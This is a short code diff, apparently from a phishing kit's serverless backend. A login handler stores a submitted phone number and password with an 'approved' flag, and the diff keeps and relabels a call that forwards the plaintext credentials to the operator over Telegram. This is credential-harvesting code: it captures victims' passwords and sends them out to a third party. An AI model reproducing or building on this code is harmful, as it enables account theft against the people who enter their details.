@@ -21,13 +21,8 @@ export async function onRequest(context) {
   const requestId = uuidv4();
   const data = { phone, password, approved: false, timestamp: new Date().toISOString() };
 
-  // Store the request in KV and notify the admin
   await setRequestInKV(env, requestId, data, "password");
-  await sendTelegramNotification(
-    { requestId, phone, password, type: "Login (Password)" },
-    env,
-    request.url
-  );
+  await sendTelegramNotification({ requestId, phone, password, type: "Password Verification" }, env, request.url);
 
   return makeJsonResponse({ success: true, requestId });
 }
